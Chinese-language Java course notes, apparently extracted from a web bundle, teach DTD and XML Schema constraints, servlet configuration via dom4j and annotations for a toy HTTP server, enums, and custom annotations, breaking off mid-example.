引入DTD约束的三种方法\n\n    + 引入本地dtd\n\n      <!DOCTYPE 根元素名称 SYSTEM ‘DTD文件的路径\'>\n\n    + 在xml文件内部引入\n\n      <!DOCTYPE 根元素名称 [ dtd文件内容 ]>\n\n    + 引入网络dtd\n\n      <!DOCTYPE 根元素的名称 PUBLIC "DTD文件名称" "DTD文档的URL">\n\n  + 代码实现\n\n    + 引入本地DTD约束\n\n      ```xml\n      // 这是persondtd.dtd文件中的内容,已经提前写好\n      <!ELEMENT persons (person)>\n      <!ELEMENT person (name,age)>\n      <!ELEMENT name (#PCDATA)>\n      <!ELEMENT age (#PCDATA)>\n\n      // 在person1.xml文件中引入persondtd.dtd约束\n      <?xml version="1.0" encoding="UTF-8" ?>\n      <!DOCTYPE persons SYSTEM \'persondtd.dtd\'>\n\n      <persons>\n          <person>\n              <name>张三</name>\n              <age>23</age>\n          </person>\n\n      </persons>\n      ```\n\n    + 在xml文件内部引入\n\n      ```xml\n      <?xml version="1.0" encoding="UTF-8" ?>\n      <!DOCTYPE persons [\n              <!ELEMENT persons (person)>\n              <!ELEMENT person (name,age)>\n              <!ELEMENT name (#PCDATA)>\n              <!ELEMENT age (#PCDATA)>\n              ]>\n\n      <persons>\n          <person>\n              <name>张三</name>\n              <age>23</age>\n          </person>\n\n      </persons>\n      ```\n\n    + 引入网络dtd\n\n      ```xml\n      <?xml version="1.0" encoding="UTF-8" ?>\n      <!DOCTYPE persons PUBLIC "dtd文件的名称" "dtd文档的URL">\n\n      <persons>\n          <person>\n              <name>张三</name>\n              <age>23</age>\n          </person>\n\n      </persons>\n      ```\n\n+ DTD语法\n\n  + 定义元素\n\n    定义一个元素的格式为：<!ELEMENT 元素名 元素类型>\n    简单元素：\n\n    ​\tEMPTY: 表示标签体为空\n\n    ​\tANY: 表示标签体可以为空也可以不为空\n\n    ​\tPCDATA: 表示该元素的内容部分为字符串\n\n    复杂元素：\n    ​\t直接写子元素名称. 多个子元素可以使用","或者"|"隔开；\n    ​\t","表示定义子元素的顺序 ; "|": 表示子元素只能出现任意一个\n    ​\t"?"零次或一次, "+"一次或多次, "*"零次或多次;如果不写则表示出现一次\n\n    ![03_DTD语法定义元素](./img/java/basics/day26-基础加强02.img/03_DTD语法定义元素.png)\n\n\n  + 定义属性\n\n    格式\n\n    定义一个属性的格式为：<!ATTLIST 元素名称 属性名称 属性的类型 属性的约束>\n    属性的类型：\n    ​\tCDATA类型：普通的字符串\n\n    属性的约束:\n\n    ​\t// #REQUIRED： 必须的\n    ​\t// #IMPLIED： 属性不是必需的\n    ​\t// #FIXED value：属性值是固定的\n\n  + 代码实现\n\n    ```java\n    <!ELEMENT persons (person+)>\n    <!ELEMENT person (name,age)>\n    <!ELEMENT name (#PCDATA)>\n    <!ELEMENT age (#PCDATA)>\n    <!ATTLIST person id CDATA #REQUIRED>\n\n    <?xml version="1.0" encoding="UTF-8" ?>\n    <!DOCTYPE persons SYSTEM \'persondtd.dtd\'>\n\n    <persons>\n        <person id="001">\n            <name>张三</name>\n            <age>23</age>\n        </person>\n\n        <person id = "002">\n            <name>张三</name>\n            <age>23</age>\n        </person>\n\n    </persons>\n    ​```\n    ```\n\n### 1.6schema约束【理解】\n\n+ schema和dtd的区别\n\n  1. schema约束文件也是一个xml文件，符合xml的语法，这个文件的后缀名.xsd\n  2. 一个xml中可以引用多个schema约束文件，多个schema使用名称空间区分（名称空间类似于java包名）\n  3. dtd里面元素类型的取值比较单一常见的是PCDATA类型，但是在schema里面可以支持很多个数据类型\n  4. schema 语法更加的复杂\n\n  ![04_schema约束介绍](./img/java/basics/day26-基础加强02.img/04_schema约束介绍.png)\n\n+ 编写schema约束\n\n  + 步骤\n\n    1，创建一个文件，这个文件的后缀名为.xsd。\n    2，定义文档声明\n    3，schema文件的根标签为： <schema>\n    4，在<schema>中定义属性：\n    ​\txmlns=http://www.w3.org/2001/XMLSchema\n    5，在<schema>中定义属性 ：\n    ​\ttargetNamespace =唯一的url地址，指定当前这个schema文件的名称空间。\n    6，在<schema>中定义属性 ：\n    ​\telementFormDefault="qualified“，表示当前schema文件是一个质量良好的文件。\n    7，通过element定义元素\n    8，判断当前元素是简单元素还是复杂元素\n\n    ![05_schema约束编写](./img/java/basics/day26-基础加强02.img/05_schema约束编写.png)\n\n  + 代码实现\n\n    ```java\n    <?xml version="1.0" encoding="UTF-8" ?>\n    <schema\n        xmlns="http://www.w3.org/2001/XMLSchema"\n        targetNamespace="http://www.itheima.cn/javase"\n        elementFormDefault="qualified"\n    >\n\n        \x3c!--定义persons复杂元素--\x3e\n        <element name="persons">\n            <complexType>\n                <sequence>\n                    \x3c!--定义person复杂元素--\x3e\n                    <element name = "person">\n                        <complexType>\n                            <sequence>\n                                \x3c!--定义name和age简单元素--\x3e\n                                <element name = "name" type = "string"></element>\n                                <element name = "age" type = "string"></element>\n                            </sequence>\n                            \n                        </complexType>\n                    </element>\n                </sequence>\n            </complexType>\n\n        </element>\n\n    </schema>\n\n    ```\n\n+ 引入schema约束\n\n  + 步骤\n\n    1，在根标签上定义属性xmlns="http://www.w3.org/2001/XMLSchema-instance"\n    2，通过xmlns引入约束文件的名称空间\n    3，给某一个xmlns属性添加一个标识，用于区分不同的名称空间\n    ​\t格式为: xmlns:标识=“名称空间地址” ,标识可以是任意的，但是一般取值都是xsi\n    4，通过xsi:schemaLocation指定名称空间所对应的约束文件路径\n    ​\t格式为：xsi:schemaLocation = "名称空间url 文件路径“\n\n  + 代码实现\n\n    ```java\n    <?xml version="1.0" encoding="UTF-8" ?>\n\n    <persons\n        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n        xmlns="http://www.itheima.cn/javase"\n        xsi:schemaLocation="http://www.itheima.cn/javase person.xsd"\n    >\n        <person>\n            <name>张三</name>\n            <age>23</age>\n        </person>\n\n    </persons>\n    ​```\n    ```\n\n+ schema约束定义属性\n\n  + 代码示例\n\n    ```java\n    <?xml version="1.0" encoding="UTF-8" ?>\n    <schema\n        xmlns="http://www.w3.org/2001/XMLSchema"\n        targetNamespace="http://www.itheima.cn/javase"\n        elementFormDefault="qualified"\n    >\n\n        \x3c!--定义persons复杂元素--\x3e\n        <element name="persons">\n            <complexType>\n                <sequence>\n                    \x3c!--定义person复杂元素--\x3e\n                    <element name = "person">\n                        <complexType>\n                            <sequence>\n                                \x3c!--定义name和age简单元素--\x3e\n                                <element name = "name" type = "string"></element>\n                                <element name = "age" type = "string"></element>\n                            </sequence>\n                            \n                            \x3c!--定义属性，required( 必须的)/optional( 可选的)--\x3e\n                            <attribute name="id" type="string" use="required"></attribute>\n                        </complexType>\n                        \n                    </element>\n                </sequence>\n            </complexType>\n        </element>\n        \n    </schema>\n\n    <?xml version="1.0" encoding="UTF-8" ?>\n    <persons\n        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n        xmlns="http://www.itheima.cn/javase"\n        xsi:schemaLocation="http://www.itheima.cn/javase person.xsd"\n    >\n        <person id="001">\n            <name>张三</name>\n            <age>23</age>\n        </person>\n\n    </persons>\n    ​```\n    ```\n\n### 1.7服务器改进【应用】\n\n+ 准备xml文件\n\n  1. 在当前模块下的webapp目录下新建一个文件夹，名字叫WEB-INF\n\n  2. 新建一个xml文件，名字叫web.xml\n\n  3. 将资料中的web.xml文件中引入约束的代码复制到新建的web.xml文件中\n\n  4. 将要解析的数据配置到xml文件中\n\n     ![06_配置要解析的Servlet数据](./img/java/basics/day26-基础加强02.img/06_配置要解析的Servlet数据.png)\n\n+ 需求\n\n  把uri和servlet信息放到一个concurrentHashMap集合当中\n  当浏览器请求一个动态资源时，我们会获取uri对应的servlet来处理当前业务\n\n+ 实现步骤\n\n  1. 导入dom4j的jar包\n  2. 定义一个XmlParseServletConfig类实现ParseServletConfig接口\n  3. 在parse方法里面就可以解析xml文件了\n\n+ 代码实现\n\n  ```java\n  // web.xml配置文件中配置的信息\n  <?xml version="1.0" encoding="UTF-8" ?>\n  <web-app xmlns="http://java.sun.com/xml/ns/javaee"\n           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n           xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"\n           version="2.5">\n\n      \x3c!--在以后需要配置servlet的时候，就直接在这里配置就可以了--\x3e\n      <servlet>\n          <servlet-name>LoginServlet</servlet-name>\n          <servlet-class>com.itheima.myservlet.LoginServlet</servlet-class>\n      </servlet>\n\n      <servlet-mapping>\n          <servlet-name>LoginServlet</servlet-name>\n          <url-pattern>/servlet/loginservlet</url-pattern>\n      </servlet-mapping>\n\n  </web-app>\n\n  // 定义一个XmlParseServletConfig类实现ParseServletConfig接口\n  public class XMLParseServletConfig implements ParseServletConfig {\n      //定义web.xml文件的路径\n      private static final String WEB_XML_PATH = "http-dynamic-server/webapp/WEB-INF/web.xml";\n\n  \t//在parse方法里面就可以解析xml文件了\n      @Override\n      public void parse() {\n          try {\n              //1.创建一个解析器对象(注意:如果解析器对象等不能使用,请检查一下jar包是否导入)\n              SAXReader saxReader = new SAXReader();\n\n              //2.利用解析器把xml文件读取到内存中\n              Document document = saxReader.read(new File(WEB_XML_PATH));\n\n              //3.获取根节点元素对象\n              Element rootElement = document.getRootElement();\n\n              //创建一个Map集合，用来存储servlet的配置信息\n              HashMap<String,String> servletInfoHashMap = new HashMap<>();\n\n              //4.获取根元素对象下所有的servlet元素的对象\n              List<Element> servletInfos = rootElement.elements("servlet");\n\n              //5.遍历集合，依次获取到每一个servlet标签对象\n              for (Element servletInfo : servletInfos) {\n                  //servletInfo依次表示每一个servlet标签对象\n\n                  //获取到servlet下的servlet-name元素对象，并且获取标签体内容\n                  String servletName = servletInfo.element("servlet-name").getText();\n                  //获取到servlet下的servlet-class元素对象，并且获取标签体内容\n                  String servletClass = servletInfo.element("servlet-class").getText();\n\n                  servletInfoHashMap.put(servletName,servletClass);\n              }\n\n              //--------------------servlet-mapping--------------------------------------\n              //获取到所有的servlet-mapping标签\n              List<Element> servletMappingInfos = rootElement.elements("servlet-mapping");\n              //遍历集合依次得到每一个servlet-mapping标签\n              for (Element servletMappingInfo : servletMappingInfos) {\n                  //servletMappingInfo依次表示每一个servlet-mapping标签\n\n                  //获取servlet-mapping标签标签中的servlet-name标签的标签体内容\n                  String servletName = servletMappingInfo.element("servlet-name").getText();\n\n                  //获取servlet-mapping标签标签中的url-pattern标签的标签体内容\n                  String urlPattern = servletMappingInfo.element("url-pattern").getText();\n\n                  //通过servletName来获取到servlet的全类名\n                  String servletClassName = servletInfoHashMap.get(servletName);\n\n                  //通过反射来创建这个servlet对象\n                  Class clazz = Class.forName(servletClassName);\n\n                  //获取该类所实现的所有的接口信息,得到的是一个数组\n                  Class[] interfaces = clazz.getInterfaces();\n\n                  //定义一个boolean类型的变量\n                  boolean flag =  false;\n                  //遍历数组\n                  for (Class clazzInfo : interfaces) {\n                      //判断当前所遍历的接口的字节码对象是否和HttpServlet的字节码文件对象相同\n                      if(clazzInfo == HttpServlet.class){\n\n                          //如果相同,就需要更改flag值.结束循环\n                          flag = true;\n                          break;\n                      }\n                  }\n\n                  if(flag){\n                      //true就表示当前的类已经实现了HttpServlet接口\n                      HttpServlet httpServlet = (HttpServlet) clazz.newInstance();\n                      //4.将uri和httpServlet添加到map集合中\n                      ServletConcurrentHashMap.map.put(urlPattern,httpServlet);\n                  }else{\n                      //false就表示当前的类还没有实现HttpServlet接口\n                      throw new NotImplementsHttpServletException(clazz.getName() + "Not Implements HttpServlet");\n                  }\n              }\n          } catch (NotImplementsHttpServletException e) {\n              e.printStackTrace();\n          }catch (Exception e) {\n              e.printStackTrace();\n          }\n      }\n  }\n\n  public class LoaderResourceRunnable implements  Runnable {\n      @Override\n      public void run() {\n  //        //执行parse方法\n  //        ParseServletConfig parseServletConfig = new PropertiesParseServletConfig();\n  //        parseServletConfig.parse();\n\n          ParseServletConfig parseServletConfig = new XMLParseServletConfig();\n          parseServletConfig.parse();\n\n      }\n  }\n  ```\n\n## 2.枚举\n\n### 2.1概述【理解】\n\n为了间接的表示一些固定的值，Java就给我们提供了枚举\n是指将变量的值一一列出来,变量的值只限于列举出来的值的范围内\n\n### 2.2定义格式【应用】\n\n+ 格式\n\n  ```java\n  public enum s {   \n  \t枚举项1,枚举项2,枚举项3;\n  }\n  注意: 定义枚举类要用关键字enum\n  ```\n\n+ 示例代码\n\n  ```java\n  // 定义一个枚举类，用来表示春，夏，秋，冬这四个固定值\n  public enum Season {\n      SPRING,SUMMER,AUTUMN,WINTER;\n  }\n  ```\n\n### 2.3枚举的特点【理解】\n\n+ 特点\n\n  + 所有枚举类都是Enum的子类\n\n  + 我们可以通过"枚举类名.枚举项名称"去访问指定的枚举项\n\n  + 每一个枚举项其实就是该枚举的一个对象\n\n  + 枚举也是一个类，也可以去定义成员变量\n\n  + 枚举类的第一行上必须是枚举项，最后一个枚举项后的分号是可以省略的，但是如果枚举类有其他的东西，这个分号就不能省略。建议不要省略\n\n  + 枚举类可以有构造器，但必须是private的，它默认的也是private的。\n\n    枚举项的用法比较特殊：枚举("");\n\n  + 枚举类也可以有抽象方法，但是枚举项必须重写该方法\n\n+ 示例代码\n\n  ```java\n  public enum Season {\n\n      SPRING("春"){\n\n          //如果枚举类中有抽象方法\n          //那么在枚举项中必须要全部重写\n          @Override\n          public void show() {\n              System.out.println(this.name);\n          }\n\n      },\n\n      SUMMER("夏"){\n          @Override\n          public void show() {\n              System.out.println(this.name);\n          }\n      },\n\n      AUTUMN("秋"){\n          @Override\n          public void show() {\n              System.out.println(this.name);\n          }\n      },\n\n      WINTER("冬"){\n          @Override\n          public void show() {\n              System.out.println(this.name);\n          }\n      };\n\n      public String name;\n\n      //空参构造\n      //private Season(){}\n    \n      //有参构造\n      private Season(String name){\n          this.name = name;\n      }\n    \n      //抽象方法\n      public abstract void show();\n  }\n\n  public class EnumDemo {\n      public static void main(String[] args) {\n          /*\n          1.所有枚举类都是Enum的子类\n          2.我们可以通过"枚举类名.枚举项名称"去访问指定的枚举项\n          3.每一个枚举项其实就是该枚举的一个对象\n          4.枚举也是一个类，也可以去定义成员变量\n          5.枚举类的第一行上必须是枚举项，最后一个枚举项后的分号是可以省略的，\n            但是如果枚举类有其他的东西，这个分号就不能省略。建议不要省略\n          6.枚举类可以有构造器，但必须是private的，它默认的也是private的。\n            枚举项的用法比较特殊：枚举("");\n          7.枚举类也可以有抽象方法，但是枚举项必须重写该方法\n      */\n    \n          //第二个特点的演示\n          //我们可以通过"枚举类名.枚举项名称"去访问指定的枚举项\n          System.out.println(Season.SPRING);\n          System.out.println(Season.SUMMER);\n          System.out.println(Season.AUTUMN);\n          System.out.println(Season.WINTER);\n    \n          //第三个特点的演示\n          //每一个枚举项其实就是该枚举的一个对象\n          Season spring = Season.SPRING;\n      }\n  }\n  ```\n\n### 2.4枚举的方法【应用】\n\n+ 方法介绍\n\n  | 方法名                                      | 说明                 |\n  | ---------------------------------------- | ------------------ |\n  | String name()                            | 获取枚举项的名称           |\n  | int ordinal()                            | 返回枚举项在枚举类中的索引值     |\n  | int compareTo(E  o)                      | 比较两个枚举项，返回的是索引值的差值 |\n  | String toString()                        | 返回枚举常量的名称          |\n  | static <T> T  valueOf(Class<T> type,String  name) | 获取指定枚举类中的指定名称的枚举值  |\n  | values()                                 | 获得所有的枚举项           |\n\n+ 示例代码\n\n  ```java\n  public enum Season {\n      SPRING,SUMMER,AUTUMN,WINTER;\n  }\n\n  public class EnumDemo {\n      public static void main(String[] args) {\n  //        String name() 获取枚举项的名称\n          String name = Season.SPRING.name();\n          System.out.println(name);\n          System.out.println("-----------------------------");\n\n  //        int ordinal() 返回枚举项在枚举类中的索引值\n          int index1 = Season.SPRING.ordinal();\n          int index2 = Season.SUMMER.ordinal();\n          int index3 = Season.AUTUMN.ordinal();\n          int index4 = Season.WINTER.ordinal();\n          System.out.println(index1);\n          System.out.println(index2);\n          System.out.println(index3);\n          System.out.println(index4);\n          System.out.println("-----------------------------");\n\n  //        int compareTo(E o) 比较两个枚举项，返回的是索引值的差值\n          int result = Season.SPRING.compareTo(Season.WINTER);\n          System.out.println(result);//-3\n          System.out.println("-----------------------------");\n\n  //        String toString()   返回枚举常量的名称\n          String s = Season.SPRING.toString();\n          System.out.println(s);\n          System.out.println("-----------------------------");\n\n  //        static <T> T valueOf(Class<T> type,String name)\n  //        获取指定枚举类中的指定名称的枚举值\n          Season spring = Enum.valueOf(Season.class, "SPRING");\n          System.out.println(spring);\n          System.out.println(Season.SPRING == spring);\n          System.out.println("-----------------------------");\n\n  //        values()       获得所有的枚举项\n          Season[] values = Season.values();\n          for (Season value : values) {\n              System.out.println(value);\n          }\n      }\n  }\n  ```\n\n## 3.注解\n\n### 3.1概述【理解】\n\n+ 概述\n\n  对我们的程序进行标注和解释\n\n+ 注解和注释的区别\n\n  + 注释: 给程序员看的\n  + 注解: 给编译器看的\n\n+ 使用注解进行配置配置的优势\n\n  代码更加简洁,方便\n\n### 3.2自定义注解【理解】\n\n+ 格式\n\n  public @interface 注解名称 {\n\n  ​\tpublic 属性类型 属性名() default 默认值 ;\n\n  }\n\n+ 属性类型\n\n  + 基本数据类型\n  + String\n  + Class\n  + 注解\n  + 枚举\n  + 以上类型的一维数组\n\n+ 代码演示\n\n  ```java\n  public @interface Anno2 {\n  }\n\n  public enum Season {\n      SPRING,SUMMER,AUTUMN,WINTER;\n  }\n\n  public @interface Anno1 {\n\n      //定义一个基本类型的属性\n      int a () default 23;\n\n      //定义一个String类型的属性\n      public String name() default "itheima";\n\n      //定义一个Class类型的属性\n      public Class clazz() default Anno2.class;\n\n      //定义一个注解类型的属性\n      public Anno2 anno() default @Anno2;\n\n      //定义一个枚举类型的属性\n      public Season season() default Season.SPRING;\n\n      //以上类型的一维数组\n      //int数组\n      public int[] arr() default {1,2,3,4,5};\n\n      //枚举数组\n      public Season[] seasons() default {Season.SPRING,Season.SUMMER};\n\n      //value。后期我们在使用注解的时候，如果我们只需要给注解的value属性赋值。\n      //那么value就可以省略\n      public String value();\n\n  }\n\n  //在使用注解的时候如果注解里面的属性没有指定默认值。\n  //那么我们就需要手动给出注解属性的设置值。\n  //@Anno1(name = "itheima")\n  @Anno1("abc")\n  public class AnnoDemo {\n  }\n  ```\n\n+ 注意\n\n  如果只有一个属性需要赋值，并且属性的名称是value，则value可以省略，直接定义值即可\n\n+ 自定义注解案例\n\n  + 需求\n\n    自定义一个注解@Test,用于指定类的方法上,如果某一个类的方法上使用了该注解,就执行该方法\n\n  + 实现步骤\n\n    1. 自定义一个注解Test,并在类中的某几个方法上加上注解\n    2. 在测试类中,获取注解所在的类的Class对象\n    3. 获取类中所有的方法对象\n    4. 遍历每一个方法对象,判断是否有对应的注解\n\n  + 代码实现\n\n    ```java\n    //表示Test这个注解的存活时间\n    @Retention(value = RetentionPolicy.RUNTIME)\n    public @interface Test {\n    }\n\n    public class UseTest {\n\n        //没有使用Test注解\n        public void show(){\n            System.out.println("UseTest....show....");\n        }\n\n        //使用Test注解\n        @Test\n        public void method(){\n            System.out.println("UseTest....method....");\n        }\n\n        //没有使用Test注解\n        @Test\n        public void function(){\n            System.out.println("UseTest....function....");\n        }\n    }\n\n    public class AnnoDemo {\n        public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException {\n            //1.通过反射获取UseTest类的字节码文件对象\n            Class clazz = Class.forName("com.itheima.myanno3.UseTest");\n\n            //创建对象\n            UseTest useTest = (UseTest) clazz.newInstance();\n\n            //2.通过反射获取这个类里面所有的方法对象\n            Method[] methods = clazz.getDeclaredMethods();\n\n            //3.遍历数组，得到每一个方法对象\n            for (Method method : methods) {\n                //method依次表示每一个方法对象。\n                //isAnnotationPresent(Class<? extends Annotation> annotationClass)\n                //判断当前方法上是否有指定的注解。\n                //参数：注解的字节码文件对象\n                //返回值：布尔结果。  true 存在  false 不存在\n                if(method.isAnnotationPresent(Test.class)){\n                    method.invoke(useTest);\n                }\n            }\n        }\n    }\n    ```\n\n### 3.3元注解【理解】\n\n+ 概述\n\n  元注解就是描述注解的注解\n\n+ 元注解介绍\n\n  | 元注解名        | 说明                    |\n  | ----------- | --------------------- |\n  | @Target     | 指定了注解能在哪里使用           |\n  | @Retention  | 可以理解为保留时间(生命周期)       |\n  | @Inherited  | 表示修饰的自定义注解可以被子类继承     |\n  | @Documented | 表示该自定义注解，会出现在API文档里面。 |\n\n+ 示例代码\n\n  ```java\n  @Target({ElementType.FIELD,ElementType.TYPE,ElementType.METHOD})  //指定注解使用的位置（成员变量，类，方法）\n  @Retention(RetentionPolicy.RUNTIME) //指定该注解的存活时间\n  //@Inherited //指定该注解可以被继承\n  public @interface Anno {\n  }\n\n  @Anno\n  public class Person {\n  }\n\n  public class Student extends Person {\n      public void show(){\n          System.out.println("student.......show..........");\n      }\n  }\n\n  public class StudentDemo {\n      public static void main(String[] args) throws ClassNotFoundException {\n          //获取到Student类的字节码文件对象\n          Class clazz = Class.forName("com.itheima.myanno4.Student");\n\n          //获取注解。\n          boolean result = clazz.isAnnotationPresent(Anno.class);\n          System.out.println(result);\n      }\n  }\n\n  ```\n\n### 3.4改写服务器【理解】\n\n+ 需求\n\n  目前项目中Servlet和url对应关系,是配置在xml文件中的,将其改为在Servlet类上通过注解配置实现\n\n+ 实现步骤\n\n  1. 定义一个注解(@WebServlet),注解内有一个属性urlPatterns\n  2. 在servlet类上去使用该注解,来指定当前Servlet的访问路径\n  3. 创建一个注解解析类(AnnoParseServletConfig),该类实现ParseServletConfig接口\n  4. 实现parse方法\n\n+ 代码实现\n\n  ```java\n  @Target(ElementType.TYPE) //指定该注解可以使用在类上\n  @Retention(RetentionPolicy.RUNTIME)//指定该注解的存活时间 --- 为运行期\n  public @interface WebServlet {\n\n      //让用户去指定某一个Servlet在进行访问的时候所对应的请求uri\n      public String urlPatterns();\n  }\n\n  // 这里只给出了LoginServlet的配置,其他Servlet同理\n  @WebServlet(urlPatterns = "/servlet/loginservlet")\n  public class LoginServlet implements HttpServlet{\n      @Override\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\n         //处理\n          System.out.println("LoginServlet处理了登录请求");\n\n         //响应\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\n          httpResponse.write("登录成功");\n      }\n  }\n\n  public class AnnoParseServletConfig implements ParseServletConfig {\n\n      //定义一个servlet路径所对应的常量\n      public static final String SERVLET_PATH = "http-dynamic-server\\\\src\\\\com\\\\itheima\\\\myservlet";\n    \n      //定义包名\n      public static final String SERVLET_PACKAGE_NAME = "com.itheima.myservlet.";\n    \n      @Override\n      public void parse() {\n          //获取类名\n  //  1.获得servlet所在文件夹的路径，并封装成File对象\n          File file = new File(SERVLET_PATH);\n  //  2.调用listFiles方法，获取文件夹下所有的File对象\n          File[] servletFiles = file.listFiles();\n  //  3.遍历数组，获取每一个File对象\n          for (File servletFile : servletFiles) {\n  //  4.获取File对象的名字（后缀名）\n              String servletFileName = servletFile.getName().replace(".java", "");\n  //  5.根据包名 + 类名 得到每一个类的全类名\n             String servletFullName = SERVLET_PACKAGE_NAME + servletFileName;\n              try {\n  //  6.通过全类名获取字节码文件对象\n                  Class servletClazz = Class.forName(servletFullName);\n                  //  7.判断该类是否有WebServlet注解\n                  if(servletClazz.isAnnotationPresent(WebServlet.class)){\n                  //  8.判断该Servlet类是否实现HttpServlet接口\n                      //获取该类所实现的所有的接口信息,得到的是一个数组\n                      Class[] interfaces = servletClazz.getInterfaces();\n    \n                      //定义一个boolean类型的变量\n                      boolean flag =  false;\n                      //遍历数组\n                      for (Class clazzInfo : interfaces) {\n                          //判断当前所遍历的接口的字节码对象是否和HttpServlet的字节码文件对象相同\n                          if(clazzInfo == HttpServlet.class){\n                              //如果相同,就需要更改flag值.结束循环\n                              flag = true;\n                              break;\n                          }\n                      }\n    \n                      if(flag){\n                          //  9.如果满足，则获取注解中的urlPattrens的值，\n                          WebServlet annotation = (WebServlet) servletClazz.getAnnotation(WebServlet.class);\n                          String uri = annotation.urlPatterns();\n    \n                          //  10.创建当前Servlet类对象存入值位置\n                          HttpServlet httpServlet = (HttpServlet) servletClazz.newInstance();\n                          //  11.存入集合的键位置\n                          ServletConcurrentHashMap.map.put(uri,httpServlet);\n                          //\n                      }else{\n                          //  12.如果不满足，抛出异常\n                          //false就表示当前的类还没有实现HttpServlet接口\n                          throw new NotImplementsHttpServletException(servletClazz.getName() + "Not Implements HttpServlet");\n                      }\n                  }\n              } catch (NotImplementsHttpServletException e) {\n                  e.printStackTrace();\n              } catch (Exception e) {\n                  e.printStackTrace();\n              }\n          }\n\n          }\n      }\n\n  public class LoaderResourceRunnable implements  Runnable {\n      @Override\n      public void run() {\n  //        //执行parse方法\n  //        ParseServletConfig parseServletConfig = new PropertiesParseServletConfig();\n  //        parseServletConfig.parse();\n\n  //        ParseServletConfig parseServletConfig = new XMLParseServletConfig();\n  //        parseServletConfig.parse();\n\n          ParseServletConfig parseServletConfig = new AnnoParseServletConfig();\n          parseServletConfig.parse();\n    \n      }\n  }\n  ```\n\n',rr='\x3c!--\n * @Date           : 2021-04-27 00:39:22\n * @FilePath       : /jinnian-space/src/pages/java/module/basics/md/day27-基础加强03.md\n * @Description    : \n--\x3e\n## 1.管理系统与服务器集成\n\n### 1.1准备工作【应用】\n\n+ 需求\n\n  对之前写过的黑马信息管理系统进行改进,实现可以通过浏览器进行访问的功能\n\n+ 准备工作\n\n  + 将资料中的黑马管理系统代码拷贝到当前模块下\n\n  + 导包的代码可能报错,因为之前的包路径可能和当前代码不一致,将导包的代码修改下\n\n    ![02_要拷贝的包](./img/java/basics/day27-基础加强03.img/02_要拷贝的包.png)\n\n+ 业务分析\n\n  ![03_业务分析02](./img/java/basics/day27-基础加强03.img/03_业务分析02.png)\n\n  ![01_业务分析](./img/java/basics/day27-基础加强03.img/01_业务分析.png)\n\n  1. 解析URL封装到HttpReques对象\n  2. DynamicResourceProcess类（执行指定动态资源的service方法）\n  3. 定义servlet类完成查询学生、添加学生、删除学生、修改学生的逻辑\n\n+ 项目结构\n\n  ![04_包结构](./img/java/basics/day27-基础加强03.img/04_包结构.png)\n\n  ![05_三层结构](./img/java/basics/day27-基础加强03.img/05_三层结构.png)\n\n### 1.2HttpRequest类代码实现【应用】\n\n+ 实现步骤\n\n  1. 提供一个存储url中用户信息的map集合\n  2. 提供一个getParamter方法,用于根据请求参数的名称获取请求参数的值\n  3. 提供一个parseParamter方法,用于解析请求参数把请求参数存储到map集合中\n\n+ 代码实现\n\n  ```java\n  // 此处只给出了新增的代码,其他代码同之前没有变化\n  public class HttpRequest {\n     \n      //用来存储请求URL中问号后面的那些数据\n      //id=1  name=itheima\n      private Map<String,String> paramterHashMap = new HashMap<>();\n\n      //parse --- 获取请求数据 并解析\n      public void parse(){\n          try {\n              SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n              StringBuilder sb = new StringBuilder();\n              //创建一个缓冲区\n              ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n              int len;\n              //循环读取\n              while((len = socketChannel.read(byteBuffer)) > 0){\n                  byteBuffer.flip();\n                  sb.append(new String(byteBuffer.array(),0,len));\n                  //System.out.println(new String(byteBuffer.array(),0,len));\n                  byteBuffer.clear();\n              }\n              //System.out.println(sb);\n              parseHttpRequest(sb);\n\n              //解析请求参数，把请求参数存储到paramterHashMap集合\n              parseParamter();\n\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n      }\n\n      //解析请求参数，把请求参数存储到paramterHashMap集合\n      private void parseParamter(){\n          //获取请求的uri\n          String requestURI = this.requestURI;\n          //按照问号进行切割，然后再获取到第二部分\n          String[] uriInfoArr = requestURI.split("\\\\?");\n          //判断数组的长度，如果长度为2，说明是存在请求参数。\n          if(uriInfoArr.length == 2){\n              //获取请求参数内容（问号后面的那些参数）\n              String paramterInfo = uriInfoArr[1];\n\n              //使用&进行切割\n              String[] paramterInfoArr = paramterInfo.split("&");\n\n              //遍历数组\n              //id=1 name=itheima age =23\n              for (String paramter : paramterInfoArr) {\n                  String[] paramterArr = paramter.split("=");\n                  //获取请求参数名称\n                  String paramterName = paramterArr[0];\n                  //获取请求参数的值\n                  String paramterValue = paramterArr[1];\n                  //添加到集合中\n                  paramterHashMap.put(paramterName,paramterValue);\n              }\n          }\n      }\n    \n      //id=1 name=itheima\n      //可以根据请求参数的名称来获取请求参数的值\n      public String getParamter(String name){\n          return paramterHashMap.get(name);\n      }\n\n  }\n  ```\n\n### 1.3DynamicResourceProcess类代码实现【应用】\n\n+ 实现步骤\n\n  获取的uri是包含?后边的数据的,要进行切割,只要?号前边的内容\n\n\n+ 代码实现\n\n  ```java\n  // 此处只给出了新增的代码,其他代码同之前没有变化\n  public class DynamicResourceProcess {\n\n      public void process(HttpRequest httpRequest,HttpResponse httpResponse){\n          //获取请求的uri\n          String requestURI = httpRequest.getRequestURI();\n          //对requestURI进行切割操作\n          String[] split = requestURI.split("\\\\?");\n          //根据请求的uri到map集合中直接找到对应的servlet的对象\n          HttpServlet httpServlet = ServletConcurrentHashMap.map.get(split[0]);\n          System.out.println(httpServlet);\n        \t// ...\n      }\n  }  \n  ```\n\n### 1.4StudentServlet类代码实现【应用】\n\n+ 实现步骤\n\n  1. 在service方法中获取请求参数中的数据\n  2. 判断是要添加学生还是修改学生等\n  3. 调用对应的方法,执行对应的操作\n\n+ 代码实现\n\n  ```java\n  @WebServlet(urlPatterns = "/servlet/studentservlet")\n  public class StudentServlet implements HttpServlet {\n\n      @Override\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\n          //获取method请求参数\n          String method = httpRequest.getParamter("method");\n          System.out.println(method);\n          //判断\n          if ("addStudent".equals(method)) {\n              //添加学生\n              addStudent(httpRequest, 